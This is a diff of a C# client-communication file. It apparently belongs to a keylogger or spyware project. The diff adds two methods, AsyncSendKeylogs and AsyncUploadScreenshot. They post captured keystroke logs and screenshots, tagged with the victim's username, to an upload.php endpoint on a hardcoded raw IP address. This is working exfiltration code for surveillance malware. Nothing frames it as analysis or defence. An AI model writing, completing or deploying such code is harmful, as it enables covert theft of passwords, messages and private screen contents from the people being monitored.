@@ -1,10 +1,13 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Collections.Specialized;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
+using System.Web;
 
 namespace Client.Communication
 {
@@ -15,48 +18,50 @@ namespace Client.Communication
         /// </summary>
         private static string API = "http://194.233.71.142/ll";
 
-        public async static Task<bool> AsyncSendPost(string endpoint, string data)
-        {
+
+        /// Endpoints:
+        // /upload.php - handles uploading of files
+
+        public async static Task<bool> AsyncSendKeylogs(string logged, string username) {
             bool result = false;
-            await Task.Run(() => {
-                result = SendRequest($"{API}/{endpoint}", data, "POST");
-            });
-            return result;
-        }
-        public async static Task<bool> AsyncSendGet(string endpoint, string data)
-        {
-            bool result = false;
-            await Task.Run(() => {
-                result = SendRequest($"{API}/{endpoint}", data, "GET");
-            });
-            return result;
-        }
-        public static bool SendRequest(string full_url, string payload, string method)
-        {
-            try
+            await Task.Run(() =>
             {
-                var request = (HttpWebRequest)WebRequest.Create(full_url);
-
-                var data = Encoding.UTF8.GetBytes(payload);
-
-                request.Timeout = 10000;
-                request.Method = method;
-                request.ContentType = "application/x-www-form-urlencoded";
-                request.ContentLength = data.Length;
-
-                using (var stream = request.GetRequestStream())
+                try
                 {
-                    stream.Write(data, 0, data.Length);
+                    HttpClient httpClient = new HttpClient();
+                    MultipartFormDataContent form = new MultipartFormDataContent();
+                    form.Add(new StringContent(logged), "logs");
+                    HttpResponseMessage response = httpClient.PostAsync($"{API}/upload.php?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
+                    httpClient.Dispose();
+                    result = true;
                 }
-
-                var response = (HttpWebResponse)request.GetResponse();
-
-                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
-
-                return true;
-            }
-            catch { }
-            return false;
+                catch
+                {
+                    result = false;
+                }
+            });
+            return result;
+        }
+        public async static Task<bool> AsyncUploadScreenshot(byte[] image_buffer, string username)
+        {
+            bool result = false;
+            await Task.Run(() =>
+            {
+                try
+                {
+                    HttpClient httpClient = new HttpClient();
+                    MultipartFormDataContent form = new MultipartFormDataContent();
+                    form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "file");
+                    HttpResponseMessage response = httpClient.PostAsync($"{API}/upload.php?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
+                    httpClient.Dispose();
+                    result = true;
+                }
+                catch
+                {
+                    result = false;
+                }
+            });
+            return result;
         }
     }
 }
